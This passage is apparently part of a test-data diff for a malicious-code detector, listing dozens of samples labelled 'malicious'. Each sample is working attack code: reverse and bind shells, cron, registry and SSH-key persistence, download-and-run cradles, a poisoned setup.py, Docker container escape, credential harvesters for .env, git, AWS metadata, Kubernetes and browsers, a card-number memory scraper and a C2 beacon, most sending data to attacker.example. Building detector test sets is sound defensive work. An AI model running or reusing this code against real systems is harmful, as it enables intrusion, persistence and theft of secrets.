+
+C2_HOST = "10.0.0.1"
+
+def exfil_icmp(data: bytes, dst: str) -> None:
+    encoded = base64.b64encode(data)
+    chunks  = [encoded[i:i+28] for i in range(0, len(encoded), 28)]
+    for i, chunk in enumerate(chunks):
+        pkt = scapy.IP(dst=dst) / scapy.ICMP(id=0xdead, seq=i) / scapy.Raw(load=chunk)
+        scapy.send(pkt, verbose=False)
+
+hostname  = os.uname().nodename.encode()
+env_dump  = str(dict(list(os.environ.items())[:10])).encode()
+payload   = hostname + b"||" + env_dump
+exfil_icmp(payload, C2_HOST)
+print(f"Exfiltrated {len(payload)} bytes via ICMP to {C2_HOST}")
+""",
+    ),
+    TestCase(
+        description="SQL injection dropper via sqlite union attack",
+        expected="malicious",
+        code="""
+import sqlite3
+import os
+
+# Simulate a vulnerable application that passes user input to SQL
+def vulnerable_search(db_path: str, user_input: str) -> list:
+    conn = sqlite3.connect(db_path)
+    # VULNERABLE: direct string formatting
+    query = f"SELECT username, email FROM users WHERE name = '{user_input}'"
+    cur = conn.cursor()
+    cur.execute(query)
+    results = cur.fetchall()
+    conn.close()
+    return results
+
+# Attack payload: UNION-based data extraction
+INJECTION = "' UNION SELECT sqlite_version(), (SELECT group_concat(username||':'||password) FROM admin_users)--"
+
+# Then write harvested data to disk
+def dump_and_exfil(data: str, outfile: str = "/tmp/.dump") -> None:
+    with open(outfile, "a") as f:
+        f.write(data + "\\n")
+    # Stage 2: send to attacker
+    os.system(f"curl -s -d @{outfile} http://attacker.example/sqli_dump")
+
+results = vulnerable_search(":memory:", INJECTION)
+dump_and_exfil(str(results))
+""",
+    ),
+    TestCase(
+        description="FTP credential brute-force",
+        expected="malicious",
+        code="""
+import ftplib
+
+TARGET = "ftp.victim.example"
+PORT   = 21
+USERS  = ["anonymous", "ftp", "admin", "root", "user", "ftpuser"]
+PWDS   = ["", "anonymous", "password", "ftp", "admin", "1234", "pass123"]
+
+hits = []
+for user in USERS:
+    for pwd in PWDS:
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(TARGET, PORT, timeout=5)
+            ftp.login(user, pwd)
+            print(f"[+] VALID: {user}:{pwd}")
+            hits.append((user, pwd))
+            # List files once logged in
+            files = ftp.nlst()
+            print(f"    Files: {files[:5]}")
+            ftp.quit()
+            break
+        except ftplib.error_perm:
+            pass
+        except Exception:
+            break
+
+with open("ftp_hits.txt", "w") as f:
+    for u, p in hits:
+        f.write(f"{TARGET}\t{u}\t{p}\\n")
+""",
+    ),
+    TestCase(
+        description="Linux cron persistence dropper",
+        expected="malicious",
+        code="""
+import os
+import subprocess
+import base64
+
+PAYLOAD_B64 = base64.b64encode(b\"\"\"
+import socket, subprocess, os
+s = socket.socket()
+s.connect(('10.0.0.1', 4444))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+subprocess.call(['/bin/bash', '-i'])
+\"\"\").decode()
+
+PAYLOAD_PATH = "/tmp/.cache_updater.py"
+
+with open(PAYLOAD_PATH, "w") as f:
+    f.write(f"import base64; exec(base64.b64decode('{PAYLOAD_B64}'))")
+os.chmod(PAYLOAD_PATH, 0o755)
+
+# Add to user crontab
+cron_line = f"@reboot python3 {PAYLOAD_PATH}\\n"
+existing  = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL, text=True)
+proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+proc.communicate(existing + cron_line)
+print(f"Persistence installed: {PAYLOAD_PATH}")
+""",
+    ),
+    TestCase(
+        description="Windows registry Run key persistence",
+        expected="malicious",
+        code="""
+import winreg
+import os
+import shutil
+import sys
+
+PAYLOAD_SRC  = sys.executable  # or __file__
+PAYLOAD_NAME = "WindowsHelperService"
+APPDATA      = os.environ.get("APPDATA", "C:\\\\Users\\\\Public")
+PAYLOAD_DST  = os.path.join(APPDATA, "svchost_helper.exe")
+
+shutil.copy(PAYLOAD_SRC, PAYLOAD_DST)
+
+REG_PATH = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE) as key:
+    winreg.SetValueEx(key, PAYLOAD_NAME, 0, winreg.REG_SZ, f'"{PAYLOAD_DST}"')
+
+print(f"[+] Registry persistence set: HKCU\\\\{REG_PATH}\\\\{PAYLOAD_NAME}")
+""",
+    ),
+    TestCase(
+        description="PowerShell download cradle via subprocess",
+        expected="malicious",
+        code="""
+import subprocess
+import os
+import tempfile
+
+PAYLOAD_URL  = "http://attacker.example/implant.ps1"
+STAGE_PATH   = os.path.join(tempfile.gettempdir(), "WindowsUpdate.ps1")
+
+# Download payload using PowerShell bypass techniques
+ps_download = (
+    f"[System.Net.WebClient]::new().DownloadFile('{PAYLOAD_URL}', '{STAGE_PATH}')"
+)
+subprocess.run(
+    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
+     "-NonInteractive", "-Command", ps_download],
+    capture_output=True,
+)
+
+# Execute downloaded payload
+subprocess.Popen(
+    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
+     "-NonInteractive", "-File", STAGE_PATH],
+    close_fds=True,
+)
+""",
+    ),
+    TestCase(
+        description="/etc/passwd reader and exfiltration",
+        expected="malicious",
+        code="""
+import requests
+import subprocess
+
+def read_system_users() -> list[dict]:
+    users = []
+    with open("/etc/passwd") as f:
+        for line in f:
+            parts = line.strip().split(":")
+            if len(parts) >= 7:
+                uid = int(parts[2])
+                users.append({
+                    "username": parts[0],
+                    "uid":      uid,
+                    "home":     parts[5],
+                    "shell":    parts[6],
+                    "has_shell": parts[6] not in ("/bin/false", "/usr/sbin/nologin", ""),
+                })
+    return users
+
+def read_shadow_hashes() -> dict:
+    hashes = {}
+    try:
+        with open("/etc/shadow") as f:
+            for line in f:
+                parts = line.strip().split(":")
+                if len(parts) >= 2 and parts[1] not in ("!", "*", ""):
+                    hashes[parts[0]] = parts[1]
+    except PermissionError:
+        pass
+    return hashes
+
+users  = read_system_users()
+hashes = read_shadow_hashes()
+requests.post("http://attacker.example/creds", json={"users": users, "hashes": hashes}, timeout=5)
+""",
+    ),
+    TestCase(
+        description=".ssh/authorized_keys backdoor injection",
+        expected="malicious",
+        code="""
+import os
+import pathlib
+
+ATTACKER_PUBKEY = (
+    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7attacker_fake_pubkey_for_test=="
+    " attacker@evil"
+)
+
+def inject_ssh_key(pubkey: str) -> bool:
+    ssh_dir      = pathlib.Path.home() / ".ssh"
+    auth_keys    = ssh_dir / "authorized_keys"
+
+    ssh_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
+
+    existing = auth_keys.read_text() if auth_keys.exists() else ""
+    if pubkey not in existing:
+        with auth_keys.open("a") as f:
+            f.write(f"\\n{pubkey}\\n")
+        auth_keys.chmod(0o600)
+        return True
+    return False
+
+if inject_ssh_key(ATTACKER_PUBKEY):
+    print("[+] Backdoor SSH key injected")
+else:
+    print("[*] Key already present")
+""",
+    ),
+    TestCase(
+        description="netcat bind shell via subprocess",
+        expected="malicious",
+        code="""
+import subprocess
+import os
+import sys
+
+BIND_PORT = 4444
+
+def start_bind_shell(port: int) -> None:
+    try:
+        # Try ncat first, fall back to nc
+        for nc_cmd in [["ncat", "-lvp", str(port), "-e", "/bin/bash"],
+                       ["nc",   "-lvp", str(port), "-e", "/bin/bash"]]:
+            result = subprocess.Popen(
+                nc_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            print(f"[+] Bind shell started on :{port} (PID {result.pid})")
+            return
+    except FileNotFoundError:
+        pass
+
+    # Fallback: pure Python bind shell
+    import socket, threading
+    def handle(conn):
+        while True:
+            cmd = conn.recv(4096).decode(errors="replace").strip()
+            if not cmd:
+                break
+            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            conn.send(out)
+
+    srv = socket.socket()
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(5)
+    print(f"[+] Python bind shell on :{port}")
+    while True:
+        conn, addr = srv.accept()
+        threading.Thread(target=handle, args=(conn,), daemon=True).start()
+
+start_bind_shell(BIND_PORT)
+""",
+    ),
+    TestCase(
+        description="LD_PRELOAD shared library hijack stub",
+        expected="malicious",
+        code="""
+import os
+import subprocess
+import tempfile
+
+C_PAYLOAD = r\"\"\"
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void _init(void) {
+    setuid(0); setgid(0);
+    system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &");
+}
+\"\"\"
+
+def compile_and_inject(target_cmd: list) -> None:
+    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as src:
+        src.write(C_PAYLOAD)
+        src_path = src.name
+
+    lib_path = "/tmp/.libcache.so"
+    subprocess.run(
+        ["gcc", "-shared", "-fPIC", "-nostartfiles", "-o", lib_path, src_path],
+        check=True, capture_output=True,
+    )
+    os.unlink(src_path)
+
+    env = os.environ.copy()
+    env["LD_PRELOAD"] = lib_path
+    subprocess.Popen(target_cmd, env=env)
+    print(f"[+] Injected LD_PRELOAD={lib_path}")
+
+compile_and_inject(["ls", "/"])
+""",
+    ),
+    TestCase(
+        description="Python package supply-chain stub (setup.py)",
+        expected="malicious",
+        code="""
+# Malicious setup.py that exfiltrates environment on pip install
+import subprocess
+import os
+import requests
+from setuptools import setup
+from setuptools.command.install import install
+
+class MaliciousInstall(install):
+    def run(self):
+        install.run(self)
+        self._exfiltrate()
+
+    def _exfiltrate(self) -> None:
+        data = {
+            "host": os.uname().nodename,
+            "user": os.environ.get("USER", "unknown"),
+            "path": os.environ.get("PATH", ""),
+            "home": str(os.path.expanduser("~")),
+            "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
+            "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
+        }
+        try:
+            requests.post("http://attacker.example/pip_install", json=data, timeout=3)
+        except Exception:
+            pass
+
+setup(
+    name="totally-legit-util",
+    version="1.0.0",
+    cmdclass={"install": MaliciousInstall},
+)
+""",
+    ),
+    TestCase(
+        description="Slack webhook data exfiltration",
+        expected="malicious",
+        code="""
+import os
+import json
+import platform
+import requests
+
+SLACK_WEBHOOK = "https://hooks.slack.com/services/FAKE/FAKE/FakeWebhookTokenHere"
+
+def exfiltrate_via_slack(webhook_url: str) -> None:
+    env_secrets = {
+        k: v for k, v in os.environ.items()
+        if any(kw in k.upper() for kw in ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASS"])
+    }
+
+    message = {
+        "text": f":warning: *New victim*",
+        "attachments": [{
+            "color": "danger",
+            "fields": [
+                {"title": "Host",     "value": platform.node(),  "short": True},
+                {"title": "OS",       "value": platform.system(), "short": True},
+                {"title": "User",     "value": os.environ.get("USER", "?"), "short": True},
+                {"title": "Secrets",  "value": json.dumps(env_secrets)[:500], "short": False},
+            ],
+        }],
+    }
+    requests.post(webhook_url, json=message, timeout=5)
+
+exfiltrate_via_slack(SLACK_WEBHOOK)
+""",
+    ),
+    TestCase(
+        description="Discord bot as C2 command executor",
+        expected="malicious",
+        code="""
+import discord
+import subprocess
+import os
+
+TOKEN = "FAKE_DISCORD_BOT_TOKEN_FOR_TESTING_PURPOSES_ONLY"
+
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+
+ALLOWED_CHANNEL = 1234567890  # attacker's channel ID
+
+@client.event
+async def on_ready():
+    print(f"[+] C2 bot online as {client.user}")
+
+@client.event
+async def on_message(message):
+    if message.channel.id != ALLOWED_CHANNEL:
+        return
+    if not message.content.startswith("!exec "):
+        return
+
+    cmd = message.content[6:]
+    try:
+        result = subprocess.check_output(
+            cmd, shell=True, stderr=subprocess.STDOUT, timeout=15
+        )
+        output = result.decode(errors="replace")[:1990]
+    except subprocess.CalledProcessError as e:
+        output = e.output.decode(errors="replace")[:1990]
+
+    await message.channel.send(f"```\\n{output}\\n```")
+
+client.run(TOKEN)
+""",
+    ),
+    TestCase(
+        description="raw socket SYN stealth scanner",
+        expected="malicious",
+        code="""
+import socket
+import struct
+import random
+
+def checksum(data: bytes) -> int:
+    s = 0
+    for i in range(0, len(data) - 1, 2):
+        s += (data[i] << 8) + data[i + 1]
+    if len(data) % 2:
+        s += data[-1]
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    return ~s & 0xFFFF
+
+def build_syn(src_ip: str, dst_ip: str, dport: int) -> bytes:
+    sport = random.randint(1024, 65535)
+    ip_hdr = struct.pack("!BBHHHBBH4s4s",
+        0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
+        socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
+    tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, 0, 0, 0x50, 0x02, 65535, 0, 0)
+    return ip_hdr + tcp_hdr
+
+TARGET = "192.168.1.1"
+SRC_IP = "192.168.1.200"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+for port in range(1, 1025):
+    s.sendto(build_syn(SRC_IP, TARGET, port), (TARGET, 0))
+print(f"SYN scan complete against {TARGET}")
+""",
+    ),
+    TestCase(
+        description="SMB share enumeration and credential capture",
+        expected="malicious",
+        code="""
+import subprocess
+import re
+import requests
+
+TARGETS = ["192.168.1.0/24"]
+
+def enumerate_smb_shares(subnet: str) -> list[dict]:
+    result = subprocess.run(
+        ["nmap", "-p", "445", "--open", "-oG", "-", subnet],
+        capture_output=True, text=True, timeout=60,
+    )
+    hosts = re.findall(r"(\d+\.\d+\.\d+\.\d+).*Ports: 445/open", result.stdout)
+
+    findings = []
+    for host in hosts:
+        shares_out = subprocess.run(
+            ["smbclient", "-L", host, "-N"],
+            capture_output=True, text=True, timeout=10,
+        )
+        shares = re.findall(r"\\s+(\\S+)\\s+Disk", shares_out.stdout)
+        findings.append({"host": host, "shares": shares})
+
+    return findings
+
+findings = enumerate_smb_shares(TARGETS[0])
+requests.post("http://attacker.example/smb_recon", json=findings, timeout=5)
+""",
+    ),
+    TestCase(
+        description="/proc/net interface scraper for lateral movement",
+        expected="malicious",
+        code="""
+import ipaddress
+import struct
+import requests
+
+def read_arp_table() -> list[dict]:
+    entries = []
+    with open("/proc/net/arp") as f:
+        next(f)  # skip header
+        for line in f:
+            parts = line.split()
+            if len(parts) >= 4:
+                entries.append({"ip": parts[0], "mac": parts[3], "iface": parts[-1]})
+    return entries
+
+def read_routes() -> list[dict]:
+    routes = []
+    with open("/proc/net/route") as f:
+        next(f)
+        for line in f:
+            parts = line.split()
+            dest = socket_hex_to_ip(parts[1])
+            gw   = socket_hex_to_ip(parts[2])
+            routes.append({"dest": dest, "gateway": gw, "iface": parts[0]})
+    return routes
+
+def socket_hex_to_ip(hex_str: str) -> str:
+    addr = int(hex_str, 16)
+    return str(ipaddress.ip_address(struct.pack("<I", addr)))
+
+network_data = {"arp": read_arp_table(), "routes": read_routes()}
+requests.post("http://attacker.example/network_recon", json=network_data, timeout=5)
+""",
+    ),
+    TestCase(
+        description="Docker socket abuse to escape container",
+        expected="malicious",
+        code="""
+import requests
+import json
+
+DOCKER_SOCK = "http+unix://%2Fvar%2Frun%2Fdocker.sock"
+
+def docker_api(method: str, path: str, **kwargs):
+    import requests_unixsocket
+    session = requests_unixsocket.Session()
+    url = f"http+unix://%2Fvar%2Frun%2Fdocker.sock{path}"
+    return session.request(method, url, **kwargs)
+
+# List containers to find victim
+containers = docker_api("GET", "/containers/json").json()
+print(f"Found {len(containers)} containers")
+
+# Create a privileged container mounting host filesystem
+payload = {
+    "Image": "alpine",
+    "Cmd": ["sh", "-c", "chroot /host sh -c 'crontab -l; echo @reboot curl http://attacker.example/sh|sh >> /tmp/cron; crontab /tmp/cron'"],
+    "HostConfig": {
+        "Binds": ["/:/host"],
+        "Privileged": True,
+        "NetworkMode": "host",
+    },
+}
+resp = docker_api("POST", "/containers/create", json=payload)
+cid = resp.json().get("Id", "")
+if cid:
+    docker_api("POST", f"/containers/{cid}/start")
+    print(f"[+] Escape container started: {cid[:12]}")
+""",
+    ),
+    TestCase(
+        description="Git credentials theft from .git-credentials",
+        expected="malicious",
+        code="""
+import os
+import pathlib
+import re
+import requests
+
+def harvest_git_credentials() -> list[dict]:
+    credentials = []
+
+    # .git-credentials (plaintext store)
+    git_creds = pathlib.Path.home() / ".git-credentials"
+    if git_creds.exists():
+        for line in git_creds.read_text().splitlines():
+            m = re.match(r"https?://([^:]+):([^@]+)@(.+)", line.strip())
+            if m:
+                credentials.append({
+                    "source": "git-credentials",
+                    "user":   m.group(1),
+                    "pass":   m.group(2),
+                    "host":   m.group(3),
+                })
+
+    # .netrc
+    netrc = pathlib.Path.home() / ".netrc"
+    if netrc.exists():
+        content = netrc.read_text()
+        for machine, login, password in re.findall(
+            r"machine\\s+(\\S+)\\s+login\\s+(\\S+)\\s+password\\s+(\\S+)", content
+        ):
+            credentials.append({"source": "netrc", "host": machine, "user": login, "pass": password})
+
+    return credentials
+
+creds = harvest_git_credentials()
+if creds:
+    requests.post("http://attacker.example/git_creds", json=creds, timeout=5)
+print(f"Harvested {len(creds)} credential entries")
+""",
+    ),
+    TestCase(
+        description="browser history stealer (Chrome/Firefox)",
+        expected="malicious",
+        code="""
+import os
+import shutil
+import sqlite3
+import requests
+import glob
+
+def steal_chrome_history() -> list[dict]:
+    pattern = os.path.expandvars(
+        r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*\\History"
+    )
+    entries = []
+    for db_path in glob.glob(pattern):
+        tmp = db_path + ".tmp"
+        shutil.copy(db_path, tmp)
+        conn = sqlite3.connect(tmp)
+        rows = conn.execute(
+            "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200"
+        ).fetchall()
+        conn.close()
+        os.unlink(tmp)
+        entries.extend({"url": r[0], "title": r[1], "visits": r[2]} for r in rows)
+    return entries
+
+def steal_firefox_history() -> list[dict]:
+    pattern = os.path.expandvars(r"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite")
+    entries = []
+    for db_path in glob.glob(pattern):
+        tmp = db_path + ".tmp"
+        shutil.copy(db_path, tmp)
+        conn = sqlite3.connect(tmp)
+        rows = conn.execute("SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 200").fetchall()
+        conn.close()
+        os.unlink(tmp)
+        entries.extend({"url": r[0], "title": r[1], "visits": r[2]} for r in rows)
+    return entries
+
+history = steal_chrome_history() + steal_firefox_history()
+requests.post("http://attacker.example/history", json=history, timeout=5)
+""",
+    ),
+    TestCase(
+        description=".env file harvester across filesystem",
+        expected="malicious",
+        code="""
+import os
+import re
+import requests
+from pathlib import Path
+
+SEARCH_DIRS = [
+    Path.home(),
+    Path("/var/www"),
+    Path("/opt"),
+    Path("/srv"),
+    Path("/home"),
+]
+MAX_FILES = 500
+SENSITIVE_KEYS = re.compile(
+    r"(PASSWORD|PASSWD|SECRET|TOKEN|API[_-]?KEY|PRIVATE|AWS|AZURE|GCP|DATABASE_URL|DB_PASS)",
+    re.IGNORECASE,
+)
+
+def harvest_env_files() -> list[dict]:
+    found = []
+    count = 0
+    for base_dir in SEARCH_DIRS:
+        if not base_dir.exists():
+            continue
+        for env_file in base_dir.rglob(".env*"):
+            if count >= MAX_FILES:
+                break
+            try:
+                content = env_file.read_text(errors="replace")
+                secrets = {}
+                for line in content.splitlines():
+                    if "=" in line and not line.startswith("#"):
+                        k, _, v = line.partition("=")
+                        if SENSITIVE_KEYS.search(k):
+                            secrets[k.strip()] = v.strip()
+                if secrets:
+                    found.append({"file": str(env_file), "secrets": secrets})
+                    count += 1
+            except (PermissionError, OSError):
+                pass
+    return found
+
+secrets = harvest_env_files()
+requests.post("http://attacker.example/env_dump", json=secrets, timeout=5)
+print(f"Harvested {len(secrets)} .env files")
+""",
+    ),
+    TestCase(
+        description="AWS metadata SSRF credential theft",
+        expected="malicious",
+        code="""
+import urllib.request
+import json
+import requests
+
+METADATA_BASE = "http://169.254.169.254/latest"
+
+def steal_aws_credentials() -> dict:
+    # Get IAM role name
+    role_url = f"{METADATA_BASE}/meta-data/iam/security-credentials/"
+    try:
+        with urllib.request.urlopen(role_url, timeout=3) as r:
+            role_name = r.read().decode().strip()
+    except Exception:
+        return {}
+
+    # Get credentials for the role
+    creds_url = f"{role_url}{role_name}"
+    with urllib.request.urlopen(creds_url, timeout=3) as r:
+        creds = json.loads(r.read())
+
+    return {
+        "role":        role_name,
+        "access_key":  creds.get("AccessKeyId"),
+        "secret_key":  creds.get("SecretAccessKey"),
+        "token":       creds.get("Token"),
+        "expiration":  creds.get("Expiration"),
+    }
+
+def get_instance_metadata() -> dict:
+    meta = {}
+    for key in ["instance-id", "public-ipv4", "local-ipv4", "hostname", "region"]:
+        try:
+            url = f"{METADATA_BASE}/meta-data/{key}"
+            with urllib.request.urlopen(url, timeout=3) as r:
+                meta[key] = r.read().decode()
+        except Exception:
+            pass
+    return meta
+
+creds    = steal_aws_credentials()
+metadata = get_instance_metadata()
+requests.post("http://attacker.example/aws", json={"creds": creds, "meta": metadata}, timeout=5)
+""",
+    ),
+    TestCase(
+        description="Kubernetes service account token exfil",
+        expected="malicious",
+        code="""
+import os
+import requests
+
+SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+SA_CA_PATH    = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+K8S_API       = "https://kubernetes.default.svc"
+
+def exfil_k8s_secrets() -> dict:
+    if not os.path.exists(SA_TOKEN_PATH):
+        return {"error": "Not running in Kubernetes"}
+
+    token = open(SA_TOKEN_PATH).read().strip()
+    headers = {"Authorization": f"Bearer {token}"}
+
+    # Dump secrets from all namespaces
+    secrets_url = f"{K8S_API}/api/v1/secrets"
+    resp = requests.get(secrets_url, headers=headers, verify=SA_CA_PATH, timeout=10)
+    raw_secrets = resp.json().get("items", [])
+
+    import base64
+    decoded = []
+    for secret in raw_secrets:
+        item = {"name": secret.get("metadata", {}).get("name"), "data": {}}
+        for k, v in (secret.get("data") or {}).items():
+            try:
+                item["data"][k] = base64.b64decode(v).decode(errors="replace")
+            except Exception:
+                item["data"][k] = v
+        decoded.append(item)
+
+    return {"token": token, "secrets": decoded}
+
+data = exfil_k8s_secrets()
+requests.post("http://attacker.example/k8s_dump", json=data, timeout=5)
+""",
+    ),
+    TestCase(
+        description="macro-enabled Office document dropper",
+        expected="malicious",
+        code="""
+import subprocess
+import os
+import urllib.request
+import tempfile
+
+# Simulate VBA macro execution that downloads and runs payload
+VBA_MACRO = \"\"\"
+Sub AutoOpen()
+    Dim url As String
+    Dim dest As String
+    url  = "http://attacker.example/implant.exe"
+    dest = Environ("TEMP") & "\\\\svchelper.exe"
+    CreateObject("WScript.Shell").Run "powershell -c (New-Object Net.WebClient).DownloadFile('" & url & "','" & dest & "'); Start-Process '" & dest & "'", 0, False
+End Sub
+\"\"\"
+
+# Pure Python equivalent (the actual dropper logic)
+PAYLOAD_URL = "http://attacker.example/implant.exe"
+DEST        = os.path.join(tempfile.gettempdir(), "svchelper.exe")
+
+def download_and_execute(url: str, dest: str) -> None:
+    urllib.request.urlretrieve(url, dest)
+    os.chmod(dest, 0o755)
+    subprocess.Popen([dest], close_fds=True, creationflags=0x00000008)  # DETACHED_PROCESS
+
+download_and_execute(PAYLOAD_URL, DEST)
+""",
+    ),
+    TestCase(
+        description="memory scraper for credit card patterns",
+        expected="malicious",
+        code="""
+import re
+import psutil
+import ctypes
+import struct
+
+CC_PATTERN = re.compile(rb"\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b")
+AMEX_PATTERN = re.compile(rb"\\b3[47][0-9]{13}\\b")
+
+def read_process_memory(pid: int, address: int, size: int) -> bytes:
+    PROCESS_VM_READ = 0x0010
+    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ, False, pid)
+    buf    = ctypes.create_string_buffer(size)
+    read   = ctypes.c_size_t()
+    ctypes.windll.kernel32.ReadProcessMemory(handle, address, buf, size, ctypes.byref(read))
+    ctypes.windll.kernel32.CloseHandle(handle)
+    return buf.raw[:read.value]
+
+found_cards = set()
+for proc in psutil.process_iter(["pid", "name"]):
+    try:
+        for region in psutil.Process(proc.info["pid"]).memory_maps():
+            chunk = read_process_memory(proc.info["pid"], int(region.addr, 16), 4096)
+            for match in CC_PATTERN.finditer(chunk):
+                found_cards.add(match.group(0).decode())
+    except (psutil.AccessDenied, Exception):
+        pass
+
+import requests
+if found_cards:
+    requests.post("http://attacker.example/cards", json=list(found_cards), timeout=5)
+""",
+    ),
+    TestCase(
+        description="sudo -l privilege escalation recon",
+        expected="malicious",
+        code="""
+import subprocess
+import re
+import requests
+import os
+
+GTFOBINS = {
+    "vim":     "vim -c ':!/bin/bash'",
+    "python":  "python -c 'import os; os.system(\"/bin/bash\")'",
+    "python3": "python3 -c 'import os; os.system(\"/bin/bash\")'",
+    "perl":    "perl -e 'exec \"/bin/bash\";'",
+    "find":    "find . -exec /bin/bash \\;",
+    "nmap":    "nmap --interactive -e 'os.execute(\"/bin/bash\")'",
+    "less":    "less /etc/passwd  # then !bash",
+    "awk":     "awk 'BEGIN {system(\"/bin/bash\")}'",
+    "env":     "env /bin/bash",
+    "tee":     "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
+}
+
+def check_sudo_privs() -> dict:
+    try:
+        out = subprocess.check_output(["sudo", "-l"], stderr=subprocess.DEVNULL, text=True)
+    except subprocess.CalledProcessError:
+        return {"sudo_output": "", "exploits": []}
+
+    exploits = []
+    for binary, exploit in GTFOBINS.items():
+        if binary in out:
+            exploits.append({"binary": binary, "exploit": exploit})
+
+    return {
+        "user":       os.environ.get("USER"),
+        "sudo_output": out,
+        "exploits":   exploits,
+    }
+
+result = check_sudo_privs()
+requests.post("http://attacker.example/privesc", json=result, timeout=5)
+print(f"Found {len(result['exploits'])} potential sudo privesc vectors")
+""",
+    ),
+    TestCase(
+        description="GitHub token scanner from local repos",
+        expected="malicious",
+        code="""
+import re
+import os
+import requests
+from pathlib import Path
+
+TOKEN_PATTERNS = {
+    "github_pat":  re.compile(r"ghp_[0-9a-zA-Z]{36}"),
+    "github_oauth": re.compile(r"gho_[0-9a-zA-Z]{36}"),
+    "aws_key":     re.compile(r"AKIA[0-9A-Z]{16}"),
+    "aws_secret":  re.compile(r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]"),
+    "slack_token": re.compile(r"xox[baprs]-[0-9a-zA-Z\-]{10,72}"),
+    "stripe_key":  re.compile(r"sk_live_[0-9a-zA-Z]{24,}"),
+    "generic_key": re.compile(r"(?i)(api[_-]?key|token|secret|password)\s*[=:]\s*['\"][^'\"]{10,}['\"]"),
+}
+
+def scan_repos(base_dir: Path) -> list[dict]:
+    findings = []
+    for git_dir in base_dir.rglob(".git"):
+        repo_root = git_dir.parent
+        for f in repo_root.rglob("*"):
+            if f.is_file() and f.suffix in {".py", ".js", ".ts", ".env", ".yaml", ".json", ".sh", ".rb", ".go"}:
+                try:
+                    text = f.read_text(errors="replace")
+                    for pat_name, pattern in TOKEN_PATTERNS.items():
+                        for match in pattern.finditer(text):
+                            findings.append({"file": str(f), "type": pat_name, "value": match.group()})
+                except OSError:
+                    pass
+    return findings
+
+findings = scan_repos(Path.home())
+if findings:
+    requests.post("http://attacker.example/tokens", json=findings, timeout=5)
+print(f"Found {len(findings)} potential secrets")
+""",
+    ),
+    TestCase(
+        description="Python __pycache__ bytecode backdoor injector",
+        expected="malicious",
+        code="""
+import py_compile
+import compileall
+import os
+import importlib.util
+import base64
+
+PAYLOAD_SRC = base64.b64decode(
+    b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2F0dGFja2VyLmV4YW1wbGUvc2ggfCBiYXNoJyk='
+).decode()
+
+TARGET_MODULE = "/usr/lib/python3/dist-packages/urllib/request.py"
+
+def inject_bytecode_backdoor(target: str, payload: str) -> bool:
+    try:
+        with open(target, "r") as f:
+            original = f.read()
+
+        # Prepend payload to target module
+        with open(target, "w") as f:
+            f.write(payload + "\\n" + original)
+
+        # Recompile to update __pycache__
+        py_compile.compile(target, doraise=True)
+
+        # Restore original source (bytecode remains tainted)
+        with open(target, "w") as f:
+            f.write(original)
+
+        return True
+    except PermissionError:
+        return False
+
+success = inject_bytecode_backdoor(TARGET_MODULE, PAYLOAD_SRC)
+print(f"Bytecode injection: {'success' if success else 'failed (no permission)'}")
+""",
+    ),
+    TestCase(
+        description="HTTP C2 beacon with jitter and persistent polling",
+        expected="malicious",
+        code="""
+import os
+import time
+import random
+import subprocess
+import requests
+import base64
+import socket
+
+C2_URL    = "http://attacker.example/beacon"
+BEACON_ID = base64.b64encode(socket.gethostname().encode()).decode()
+SLEEP_BASE = 30
+JITTER     = 0.3
+
+def beacon() -> dict:
+    return {
+        "id":       BEACON_ID,
+        "user":     os.environ.get("USER", "?"),
+        "cwd":      os.getcwd(),
+        "pid":      os.getpid(),
+    }
+
+def execute_task(task: dict) -> str:
+    t = task.get("type")
+    if t == "shell":
+        out = subprocess.check_output(
+            task["cmd"], shell=True, stderr=subprocess.STDOUT, timeout=30
+        )
+        return out.decode(errors="replace")
+    elif t == "upload":
+        return open(task["path"], "rb").read().hex()
+    return "unknown task type"
+
+while True:
+    try:
+        r = requests.post(C2_URL, json=beacon(), timeout=10)
+        if r.status_code == 200 and r.json().get("task"):
